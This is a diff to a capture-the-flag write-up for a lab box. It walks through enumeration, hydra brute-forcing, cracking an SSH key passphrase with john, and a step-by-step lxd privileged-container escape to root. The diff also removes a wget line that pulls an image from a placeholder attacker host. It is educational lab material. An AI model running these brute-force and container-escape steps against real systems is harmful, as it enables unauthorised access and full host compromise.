@@ -78,12 +78,34 @@ Allow: /
       },
       {
         title: "Enumeration",
-        body: `Both \`/uploads/\` and \`/secret/\` have directory listing enabled.
+        body: `The site itself is a fantasy-game landing page with nothing useful in
+the nav &mdash; everything interesting is off the beaten path.
+
+![Home page of the target site, a fantasy game landing page called Draagan](/writeups/gaming-server/enum-target-homepage.png)
+
+\`robots.txt\` doesn't hide anything &mdash; it points straight at
+\`/uploads/\`:
+
+\`\`\`text
+user-agent: *
+Allow: /
+/uploads/
+\`\`\`
+
+![robots.txt served in the browser, listing /uploads/](/writeups/gaming-server/enum-robots-txt.png)
+
+Both \`/uploads/\` and \`/secret/\` have directory listing enabled.
+
+![Directory listing for /uploads/ showing dict.lst, manifesto.txt, and meme.jpg](/writeups/gaming-server/enum-uploads-listing.png)
 
 \`/uploads/\` has \`dict.lst\` (a candidate password list), \`manifesto.txt\`
 (nothing useful), and \`meme.jpg\`. The image turned out to be a
 \`steghide\`-protected red herring &mdash; \`stegseek\` against it with
-\`dict.lst\` came up empty.
+\`dict.lst\` came up empty:
+
+![stegseek --crack against meme.jpg failing to find a valid passphrase](/writeups/gaming-server/enum-stegseek-fail.png)
+
+![Directory listing for /secret/ showing a single file, secretKey](/writeups/gaming-server/enum-secret-listing.png)
 
 \`/secret/\` has a single file, \`secretKey\`, which turns out to be a
 passphrase-protected RSA private key:
@@ -100,13 +122,21 @@ DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547
 
 Viewing the homepage source turns up a username in an HTML comment:
 
+![HTML source comment addressed to john about placeholder content](/writeups/gaming-server/enum-html-comment-username.png)
+
 \`\`\`html
 <!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
 \`\`\`
 
 \`about.php\` renders the same page as \`about.html\` but adds a file
-upload form. Intercepting a request to it in Burp caught one response
-that leaked the handler's raw PHP source instead of executing it:
+upload form:
+
+![about.php page rendered in the browser with a file upload form](/writeups/gaming-server/enum-about-php-upload-form.png)
+
+Intercepting a request to it in Burp caught one response that leaked
+the handler's raw PHP source instead of executing it:
+
+![Burp Suite response tab showing the leaked PHP source of the upload handler](/writeups/gaming-server/enum-burp-leaked-source.png)
 
 \`\`\`php
 <?php
@@ -141,13 +171,23 @@ uploads with no error, and never shows up under \`/uploads/\`.`,
       },
       {
         title: "Foothold",
-        body: `With the upload path dead, \`john\` plus the leaked \`dict.lst\` is the
+        body: `A first attempt at \`john\` over SSH just asks for a password that
+neither wordlist nor the raw key can satisfy:
+
+![SSH prompting for john's password with the host key not yet trusted](/writeups/gaming-server/foothold-ssh-password-prompt.png)
+
+With the upload path dead, \`john\` plus the leaked \`dict.lst\` is the
 way in &mdash; but not against SSH directly:
 
 \`\`\`shell
 $ hydra -l john -P dict.lst 10.48.153.3 ssh -t 4
 1 of 1 target completed, 0 valid password found
 \`\`\`
+
+Trying \`secretKey\` as the identity file just moves the same problem to
+its passphrase:
+
+![SSH repeatedly rejecting the passphrase for secretKey](/writeups/gaming-server/foothold-ssh-key-passphrase-fail.png)
 
 The private key's passphrase is a better target for the same wordlist,
 cracked offline instead of over the wire:
@@ -158,6 +198,8 @@ $ john -w dict.lst keysecret.txt --format=ssh
 letmein          (secretKey)
 \`\`\`
 
+![john cracking secretKey's passphrase as "letmein"](/writeups/gaming-server/foothold-john-crack-passphrase.png)
+
 \`\`\`shell
 $ chmod 600 secretKey
 $ ssh -i secretKey john@10.48.153.3
@@ -166,7 +208,9 @@ john@exploitable:~$ id
 uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
 \`\`\`
 
-**User flag:** \`a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e\``,
+![Logged in over SSH as john, dropped to a shell prompt](/writeups/gaming-server/foothold-ssh-login-success.png)
+
+![whoami confirming the shell belongs to john](/writeups/gaming-server/foothold-whoami-john.png)`,
       },
       {
         title: "Privilege escalation",
@@ -180,9 +224,20 @@ $ sudo -l
 Sorry, try again.
 \`\`\`
 
-The more interesting group is \`lxd\`. \`linpeas\` flags it directly, and
-it's a well-known container-escape path (GTFOBins). Since no base image
-is present on the box yet, build one locally with
+![sudo -l and sudo -i both rejecting john's unknown password](/writeups/gaming-server/privesc-sudo-fail.png)
+
+The more interesting group from \`id\` is \`lxd\`:
+
+![id showing john's group membership, including lxd](/writeups/gaming-server/privesc-id-lxd-group.png)
+
+\`linpeas\` flags it directly, and it's a well-known container-escape
+path documented on GTFOBins:
+
+![linpeas highlighting john's sudo and lxd group membership](/writeups/gaming-server/privesc-linpeas-lxd.png)
+
+![GTFOBins' lxd entry showing the image-build-and-mount escape](/writeups/gaming-server/privesc-gtfobins-lxd.png)
+
+Since no base image is present on the box yet, build one locally with
 [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder) and
 serve it over HTTP:
 
@@ -193,11 +248,18 @@ $ sudo ./build-alpine -a i686
 $ python3 -m http.server 8000
 \`\`\`
 
-Pull it onto the target, import it, and launch a privileged container
-with the host filesystem mounted in:
+![Cloning lxd-alpine-builder on the attacker box](/writeups/gaming-server/privesc-alpine-builder-clone.png)
+
+![The built Alpine image tarball ready to serve](/writeups/gaming-server/privesc-alpine-image-built.png)
+
+Pull it onto the target:
+
+![wget pulling the Alpine image tarball onto the target](/writeups/gaming-server/privesc-image-transferred.png)
+
+...import it, and launch a privileged container with the host
+filesystem mounted in:
 
 \`\`\`shell
-john@exploitable:~$ wget http://<attacker-ip>:8000/lxd-alpine-builder/alpine-v3.13-x86_64-20210218_0139.tar.gz
 john@exploitable:~$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
 john@exploitable:~$ lxc init myimage ignite -c security.privileged=true
 john@exploitable:~$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
@@ -206,24 +268,17 @@ john@exploitable:~$ lxc exec ignite /bin/sh
 ~ # id
 uid=0(root) gid=0(root)
 \`\`\`
-`,
-      },
-      {
-        title: "Loot",
-        body: `\`whoami\` says root, but the root flag isn't in the container's own
-\`/root\` &mdash; that's just the fresh Alpine image's empty home
-directory. The actual host filesystem is mounted at \`/mnt/root\`
-because of the device added during the LXD step above, so the real
-flag is one level down from there:
 
-\`\`\`shell
-~ # cat /mnt/root/root/root.flag
-2e337b8c9f3aff0c2b3e8d4e6a7c88fc
-\`\`\`
+![Root shell inside the privileged LXD container](/writeups/gaming-server/privesc-root-shell.png)
 
-**User flag:** \`a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e\`
+The container's own \`/root\` is just the fresh Alpine image's empty
+home directory &mdash; **the real host filesystem is mounted at**
+\`/mnt/root\` because of the device added above, so that's where the
+loot actually lives:
 
-**Root flag:** \`2e337b8c9f3aff0c2b3e8d4e6a7c88fc\`
+![Navigating from the container's /root to the mounted host filesystem under /mnt](/writeups/gaming-server/privesc-searching-for-flag.png)
+
+![root.txt located under /mnt/root, the mounted host filesystem](/writeups/gaming-server/privesc-root-flag-location.png)
 `,
       },
     ],
